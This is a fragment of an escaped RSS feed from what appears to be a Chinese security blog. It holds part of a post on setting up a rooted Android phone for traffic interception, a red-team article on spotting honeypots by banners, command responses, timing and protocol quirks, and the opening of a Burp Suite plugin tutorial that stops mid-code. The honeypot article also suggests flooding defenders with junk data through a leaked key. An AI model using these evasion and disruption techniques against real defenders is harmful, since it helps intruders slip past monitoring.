alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来安装rirucore，在github获取官方包后用magisk装一下，当然进入recovery模式和之前一样用sideload也可以刷入，下载地址&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/RikkaApps/Riru/releases/&#34;&gt;https://github.com/RikkaApps/Riru/releases/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b5cb8168-7320-4c77-98d8-44660e722c76.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;重启之后没有出现新的软件图标，在magisk的模块中可以看到已经加载&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/91791d82-2dae-44aa-8443-9dd734c04d25.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续安装Edxposed的时候又出问题了，配个环境真就一直踩坑&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/846ccc88-e281-452a-ae1e-614e5bf792e0.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Edxposed检测不到Riru框架了，主要版本太新，还是降版本解决问题，使用25版本的Riru解决问题&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/908c7cca-3d83-4e8e-8a62-ade4b32f90bf.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;重启完就可以看到我们的Edxposed了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/b97eea39-9564-4c56-af33-5caf20ff5232.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据提示安装完整版的Edxposed&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/367af7e1-e3c9-48a7-ad88-bd2379d3243f.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/a1f5f146-7a17-4727-8693-60275c5fa40f.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后就是一些常规的环境配置，比如BP的证书导入，由于Android7开始系统更改了信任用户安装的证书的默认行为，应用程序仅信任系统级CA，所以需要对证书进行一定的更改才能使用（其实这个文章也有很多人写过了，我这里就再水一水）&lt;/p&gt;&#xA;&lt;p&gt;建议重新生成BP证书，在Proxy-Options中进行&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/c1cc0521-e630-4ce0-b15f-c5d63f0dfebe.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;对证书进行一波简单操作&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/084b0cdb-4a91-41d3-ab65-61f2a3c9ebd9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过ADB push将证书移到对应的目录下&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/e7b40647-c46b-4bb7-8646-50171fe20f37.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;测试一下访问百度可以正常抓到包，证书安装成功&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/81867ee0-63c7-440a-b88a-187cd07802aa.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接着再装一些基础环境比如frida等，可以按需进行配置&lt;/p&gt;&#xA;&lt;p&gt;顺便简单写一下frida的环境配置，首先去官网下载对应Python版本的frida包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/970a489c-b895-4eda-9c0d-08276089e688.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;下载完成后进行安装，一般在运行setup.py的时候会自动下载frida对应的egg，通常来说因为大家都懂的原因下载速度会很慢，只要找到输出的下载目录直接把刚刚下载的egg文件拖进去再重新执行install命令就行&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/e7f01076-c9cf-46b9-9f29-ee0f16e96b59.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>浅析红蓝对抗中的蜜罐与虚拟机识别技术</title>
      <link>http://localhost:1313/posts/%E6%B5%85%E6%9E%90%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%AD%E7%9A%84%E8%9C%9C%E7%BD%90%E4%B8%8E%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/</link>
      <pubDate>Mon, 15 Mar 2021 09:08:11 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E6%B5%85%E6%9E%90%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%AD%E7%9A%84%E8%9C%9C%E7%BD%90%E4%B8%8E%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;蜜罐简介&#34;&gt;蜜罐简介&lt;/h2&gt;&#xA;&lt;p&gt;在以前，蜜罐是用来抓熊的。通过伪装成“食物”引诱熊前来享用，最后猎人再将熊一举拿下。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a1.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;到了今天，蜜罐技术已经成为网络安全中的一种入侵诱饵，目的是引诱黑客前来攻击，并收集黑客相关的证据和信息。所以蜜罐存在的意义就是——被攻击、被探测、被攻陷&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;根据部署方式，蜜罐可能被归类为：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;**生产蜜罐：**易于使用，仅捕获有限的信息，主要由公司使用。生产蜜罐被组织放置在生产网络内与其他生产服务器一起，以改善其整体安全状态。通常生产蜜罐是低交互蜜罐，更易于部署。与研究蜜罐相比，它们提供的攻击或攻击者信息较少。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;**研究蜜罐：**是为了收集有关针对不同网络的黑客社区的动机和策略的信息。这些蜜罐不会为特定组织增加直接价值; 相反，它们用于研究组织面临的威胁，并学习如何更好地防范这些威胁。研究蜜罐的部署和维护非常复杂，可以捕获大量信息，主要用于研究、军事或政府组织。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;目前红蓝对抗中使用的研究型蜜罐偏多，可以记录详细的信息以用于溯源&lt;/p&gt;&#xA;&lt;p&gt;蜜罐产品分类多样，功能也是各不相同，目前市场上常见的蜜罐非常多，商用成型的蜜罐产品随便一搜都有几十款之多。蜜罐从设计标准上来说分为纯蜜罐，高交互蜜罐，低交互蜜罐&lt;/p&gt;&#xA;&lt;p&gt;目前来看多数蜜罐为低交互蜜罐，优秀的产品均向高交互蜜罐方向发展，但是由于一些原因导致部分高交互蜜罐容易出现问题，可以被非常方便地检测出来。&lt;/p&gt;&#xA;&lt;p&gt;纯蜜罐通常来说只存在大量特征，用于单纯地应对扫描器的扫描，这种蜜罐的特征非常明显，访问时通常是空白页，但是在源码中可以看到为隐藏属性的大量关键字，通常用于应对扫描器的识别&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a2.png&#34; alt=&#34;image-20210315174111636&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在常见的识别工具例如Wappalyzer中也显示出了大量的识别结果（这是新版本的wappalyzer中的显示结果，低置信度的结果会在新版本中根据相应选择算法被丢弃，而在旧版本中会把所有触发检测规则的框架等全部包含，可能显示的数字高达数百至数千）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a3.png&#34; alt=&#34;image-20210315174341524&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;另一款主流蜜罐kippo，在Github上是一款评分相对非常高的蜜罐，遗憾的是已经很多年没有更新了，曾经作为一款蜜罐还是非常火热的，虽然最后一个release版本是14年发布的，但是去年仍有文章在写这款蜜罐&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/image-20210401110005363.png&#34; alt=&#34;image-20210401110005363&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;作为较老的蜜罐，其实通过shodan和fofa等网络空间资产搜索引擎还是发现了大量部署了该蜜罐的服务器和设备。根据分析提取特征后发现，这款蜜罐虽然当时比较优秀，但是特征还是很明显的。分析后总结如下：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;SSH版本固定，返回的banner信息为SSH-2.0-OpenSSH_5.1p1 Debian-5&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;构造畸形包来尝试请求连接，由于kippo协议实现的原因不会像正常的连接一样返回Protocol mismatch，可以作为另一点&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;基于以上两点就可以快速分辨出目标是否为kippo蜜罐，当然hvv的目标里应该见不太到这类古董了&lt;/p&gt;&#xA;&lt;p&gt;同样，还有一些低交互蜜罐则可以返回一些简单的命令，以互联网上一款非常热门的开源蜜罐Hfish为例，由于某些原因，我在本地搭建测试的为2020年12月发布的版本，在官方文档中看到的Hifish的描述如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a4.png&#34; alt=&#34;image-20210317102603325&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;定制蜜罐需要用户自行配置，例如我们在配置文件中可以看到相关服务的启停情况&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a5.png&#34; alt=&#34;image-20210317113955629&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过nmap扫描已经开启蜜罐的机器，通过服务识别时给我们的反馈如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a6.png&#34; alt=&#34;image-20210317114623361&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以看到启动的服务非常之多，常规机器上开启如此多服务的并不常见，开放大量端口的极有可能是蜜罐，另外在做信息收集时肯定会扫描网段，通常蜜罐不会只放置一台，在同一个C段搭数台蜜罐机器是很常见的，&lt;strong&gt;如果在同网段发现多数机器开放大量端口且端口相同，请求后的返回相似，有可能部署了一系列的蜜罐。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;另外一点检测蜜罐的方式就是通过命令交互&lt;/strong&gt;，Hfish的规则需要用户自己定义，以ssh为例，通过SSH登录蜜罐&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a7.png&#34; alt=&#34;image-20210317115146380&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一个问题就是命令需要自己配置，在ls命令时并没有看出什么明显的问题，但执行whoami和id时无法返回正确的结果，需要我们在配置文件中进行配置，配置文件中默认支持的指令写的非常少&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a8.png&#34; alt=&#34;image-20210317115611917&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当输入除此以外的命令时，即使输入为空也会返回test&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a9.png&#34; alt=&#34;image-20210317115812675&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此外，根据其默认提供的ls -all命令，我们也可以尝试一下，可以看到返回的时间均为2017年，明显早于现在，这也是其中一个较为明显的发现点。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a12.png&#34; alt=&#34;image-20210317180648863&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同样再来看一下我们在日常使用的kali上的执行结果，差别很明显就出来了&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a13.png&#34; alt=&#34;image-20210317180800906&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在没有一定基础的用户使用的时候，通过该种类型的配置漏洞可以很方便地发现问题。不过此时的Hfish配置启用的是高交互ssh蜜罐（也是Hfish的默认配置选项），还可以被配置成低交互状态，此时不能执行命令可以使上述判断无效化，所有的登录请求都会被拒绝&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a10.png&#34; alt=&#34;image-20210317120245794&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这时候可以避免很多问题，但是经过扫描你会发现开放的端口中会有一些WEB服务，有可能目标机器是真实环境，并且部署了Hfish来捕获攻击，并且相关服务拟真，你无法判断目标服务的真实有效性。如果是蜜罐构造的WEB环境，很有可能存在纰漏，例如HFish的蜜罐构造的假WEB页面，其中只有两个js，并且x.js可以很明显的发现蜜罐特征，并且在溯源反制上，你可以直接通过泄露出的seckey给目标填塞大量的垃圾数据影响蓝队的判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/image-20210409182544926.png&#34; alt=&#34;image-20210409182544926&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在真实的wordpress中可以则看到大量js，这也可以用于判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/image-20210409183309237.png&#34; alt=&#34;image-20210409183309237&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同时还可以根据浏览器的发包请求来判断包内容，包中的钓鱼很明显就告诉攻击者这是个蜜罐&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/image-20210409190726775.png&#34; alt=&#34;image-20210409190726775&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;延续上文中讲的C段蜜罐，根据测试结果发现，大部分蜜罐的回应和发包的时间戳都是相对固定的，而物理服务器则会有偏差，通常物理服务器返回的时间戳会存在一定的偏差，我们通过抓包来复现了一下返回过程&lt;/p&gt;&#xA;&lt;p&gt;首先通过ssh连接机器并且执行了一些命令&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a14.png&#34; alt=&#34;image-20210318112534739&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;至所有命令执行结束时我们一共获取到了129个数据包，分析发出命令的包到收到回包的时间&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a15.png&#34; alt=&#34;image-20210318112706170&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a16.png&#34; alt=&#34;image-20210318113200808&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;执行前几条命令时响应时间为0.000148s,0.000105s,0.000132s&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;我们再开启蜜罐，为了防止其他因素影响，将返回值设置成与之前正常请求kali时相同，但是测试时发生了一个非常尴尬的情况，开启这款蜜罐后所有的传输都是TCP，并没有SSH&amp;hellip;又直接暴露了一个问题&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a17.png&#34; alt=&#34;image-20210318115157300&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../img/a18.png&#34; alt=&#34;image-20210318115219075&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;所以根据协议进行识别是一个较为有效的方式，360Quake研究过不少蜜罐的协议实现，以下引用当时的研究结果：拿Dionaea 的Memcached协议举例，在实现Memcached协议时Dionaea把很多参数做了随机化，但是在一些参数如：version、libevent和rusage_user等都是固定的。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210409175349.jpg&#34; alt=&#34;微信图片_20210409175349&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;总结表如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../1.assets/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210409175630.jpg&#34; alt=&#34;微信图片_20210409175630&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;相对其他协议的实现也可以进行深入研究，例如Mysql协议，近期在hvv前夕也涌现出了非常多的开源或闭源的Mysql蜜罐，检测此类蜜罐的步骤可分为如下几步：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;伪造客户端连接蜜罐mysql服务&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;连接成功发送mysql查询请求&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;接受mysql服务器响应，通过分析伪造的mysql客户端读取文件的数据包得到的报文结构：文件名长度+1 + \x00\x00\x01\xfb + 文件名&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（三）——武装你的Burpsuite（下）</title>
      <link>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E4%BC%AA%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8B/</link>
      <pubDate>Tue, 12 Jan 2021 04:09:28 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%89%E4%BC%AA%E8%A3%85%E4%BD%A0%E7%9A%84burpsuite%E4%B8%8B/</guid>
      <description>&lt;p&gt;前两篇文章主要讲了一下Burpsuite的插件，并且介绍了Burpsuite的API，本篇文章主要内容为高级插件的开发。&lt;/p&gt;&#xA;&lt;p&gt;首先在上节内容最后留了一个坑，就是有个报错的问题，其实呢这个问题是我们自己造成的，因为在最后一句写了一个抛出异常的语句，该语句会导致即使没有错误也会报错误，在我们换成如下写法后再编译就不报错了。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们接着来写一个带有图形化选项卡的小插件。带有UI的插件在查阅了一些资料后发现需要Java中AWT和Swing的支持，对Java开发较为熟悉的同学开发起来还是很友好的，这里简单科普一下AWT和Swing。&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;AWT(Abstract Window Toolkit)，中文译为抽象窗口工具包，该包提供了一套与本地图形界面进行交互的接口，是Java提供的用来建立和设置Java的图形用户界面的基本工具。AWT中的图形函数与操作系统所提供的图形函数之间有着一一对应的关系，称之为peers，当利用AWT编写图形用户界面时，实际上是在利用本地操作系统所提供的图形库。由于不同操作系统的图形库所提供的样式和功能是不一样的，在一个平台上存在的功能在另一个平台上则可能不存在。为了实现Java语言所宣称的“一次编写，到处运行(write once, run anywhere)”的概念，AWT不得不通过牺牲功能来实现平台无关性，也即AWT所提供的图形功能是各种操作系统所提供的图形功能的交集。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Swing 是一个为Java设计的GUI工具包。Swing是JAVA基础类的一部分。Swing包括了图形用户界面（GUI）器件如：文本框，按钮，分隔窗格和表。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Swing提供许多比AWT更好的屏幕显示元素。它们用纯Java写成，所以同Java本身一样可以跨平台运行，这一点不像AWT。它们是JFC的一部分。它们支持可更换的面板和主题（各种操作系统默认的特有主题），然而不是真的使用原生平台提供的设备，而是仅仅在表面上模仿它们。这意味着你可以在任意平台上使用JAVA支持的任意面板。轻量级组件的缺点则是执行速度较慢，优点就是可以在所有平台上采用统一的行为。&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;画图的时候我用了Jpanel和Jbutton，用AWT来捕获鼠标事件，实现点击按钮触发事件。通过getTabCaption和getUiComponent给选项卡命名，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后创建界面和按钮jPanelMain = new JPanel();JButton jButton = new JButton(&amp;ldquo;Test Button&amp;rdquo;);&lt;/p&gt;&#xA;&lt;p&gt;加载成功后可以看到上了一个标签&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以及一个居中的按钮&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;每按一次会输出一个Clicked&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;大致了解了各个API的方法后，我们可以尝试来写一些能够提升我们工作效率的事，首先实现捕获其他模块的消息，以便对消息进行处理。根据官方文档调用以下方法：&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerHttpListener()&lt;/p&gt;&#xA;&lt;p&gt;注册HTTP监听器&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerProxyListener()&lt;/p&gt;&#xA;&lt;p&gt;注册Proxy监听器&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerScannerListener()&lt;/p&gt;&#xA;&lt;p&gt;注册Scanner监听器&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerExtensionStateListener()&lt;/p&gt;&#xA;&lt;p&gt;注册ExtensionState监听器&lt;/p&gt;&#xA;&lt;p&gt;callbacks.registerScopeChangeListener()&lt;/p&gt;&#xA;&lt;p&gt;注册ScopeChangeListener监听器&lt;/p&gt;&#xA;&lt;p&gt;首先还是框架的搭建，在公共类BurpExtender中implements所需要调用的接口IBurpExtender, IHttpListener, IProxyListener, IScannerListener, IExtensionStateListener, IScopeChangeListener，引入接口后需要再进行方法重写，不然会报错&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据文档补全接口内容，写上对应的输出&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps9.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;编译后加载插件，此时可以看到输出是空白的，因为该插件用于捕获数据，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们打开Proxy拦截后访问几个网页，在历史中已经记录了很多数据&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再来看我们的插件输出窗口，输出了大量的日志&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如果觉得Burpsuite自带的分析工具不好用的话可以直接通过这个插件将捕获到的事件进行输出，只需要在插件控制的输出页面选择保存到文件即可&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml22384/wps13.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;该插件的完整代码如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; burp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.PrintWriter;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BurpExtender&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;implements&lt;/span&gt; IBurpExtender, IHttpListener, &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    IProxyListener, IScannerListener, IExtensionStateListener, IScopeChangeListener&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; IBurpExtenderCallbacks callbacks;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; PrintWriter stdout;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;@Override&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;registerExtenderCallbacks&lt;/span&gt;(IBurpExtenderCallbacks callbacks)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;callbacks&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; callbacks;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;​&lt;/span&gt;    callbacks.&lt;span style=&#34;color:#a6e22e&#34;&gt;setExtensionName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Advanced Event Listener&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 